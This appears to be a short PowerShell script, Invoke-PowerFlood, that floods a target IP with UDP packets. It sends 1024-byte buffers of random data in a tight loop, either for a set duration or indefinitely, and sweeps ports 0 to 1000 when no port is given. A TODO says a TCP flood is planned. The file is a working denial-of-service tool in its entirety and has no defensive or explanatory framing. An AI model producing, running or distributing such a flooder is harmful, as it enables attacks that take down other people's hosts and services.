<#
UDP flood with PowerShell
TODO: TCP flood
#>     
function Invoke-PowerFlood {
 
    [CmdletBinding()] Param(
     
    [Parameter(Position=0)]
    [String]$targetIP,
    [Parameter(Position=1)]
    $duration = 0,
    [Parameter(Position=2)]
    $port = -1
 
    )
     function udpEngine {
 
    [CmdletBinding()] Param(
     
    [Parameter(Position=0, Mandatory = $true)]
    [String]$tIP,
     
    [Parameter(Position=1, Mandatory = $true)]
    [String]$prt
     
    )
     
    $address = [system.net.IPAddress]::Parse( $tIP )  
 
    # Create IP Endpoint   
    $end = New-Object System.Net.IPEndPoint $address , $prt
 
    # Create Socket   
    $Saddrf    = [System.Net.Sockets.AddressFamily]::InterNetwork  
    $Stype    = [System.Net.Sockets.SocketType]::Dgram  
    $Ptype     = [System.Net.Sockets.ProtocolType]::UDP  
    $Sock      = New-Object System.Net.Sockets.Socket $saddrf , $stype , $ptype  
#    $Sock.TTL = 26
    $StopWatch = New-Object -TypeName System.Diagnostics.Stopwatch
    if ($duration -ne 0) {
    $StopWatch.start()
    }
    while ($StopWatch.Elapsed.Seconds -lt $duration -Or $duration -eq 0) {  
        $sock.Connect( $end )  
        # Send random data of size 1024 bytes
        $Enc = [System.Text.Encoding]::ASCII
        $Message = New-Object Byte[] 1024
        (New-Object Random).NextBytes($Message);
        # Send the buffer   
        $Sent   = $Sock.Send( $Message )  
     
    }
     
}
    if ($targetIP) {
        # launch udp flood on range of ports if no port specified
        if ($port -eq -1) {foreach ( $port in 0..1000 ) { udpEngine $targetIP $port }} else
        {udpEngine $targetIP $port}
 
    } else { write-host -ForegroundColor "Red" "[!] target IP not specified!" }
}
#Invoke-PowerFlood 192.168.1.191 8 53
